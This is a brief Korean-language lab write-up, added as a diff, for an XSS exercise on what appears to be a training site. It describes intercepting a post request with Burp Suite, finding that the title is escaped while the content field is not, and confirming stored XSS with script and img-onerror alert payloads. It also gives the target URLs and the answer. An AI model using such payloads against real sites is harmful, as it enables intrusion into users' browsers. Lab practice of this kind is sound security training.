@@ -1,0 +1,35 @@
+==============================
+XSS 7번
+==============================
+
+1. 공격 과정
+
+① 새 게시글을 작성하고 Burp Suite로 POST 요청을 가로챔.
+
+② title에 <script>alert(1)</script> 삽입 → HTML 엔티티로 변환되어 실행되지 않음.
+
+③ content에 <script>alert(2)</script> 삽입 → 새 게시글에 접근하자 alert(2) 실행 성공.
+
+④ <img src=x onerror=alert(1)> 구문도 실행 확인.
+
+2. 필터링 방식
+
+title은 HTML 이스케이프 처리됨.
+content는 필터링이 미흡하여 XSS 실행 가능.
+
+3. URL
+
+1) 공격구문 삽입 URL
+https://lab.eqst.co.kr:8083/exam21/process/faqboardProcess.php
+
+2) 삽입 파라미터 및 공격 구문
+content=<img src=x onerror=alert('XSS')>
+
+3) 공격 실행 URL
+https://lab.eqst.co.kr:8083/exam21/faqview.php?board_id=34712
+
+4. 정답
+
+XSS
+
+==============================
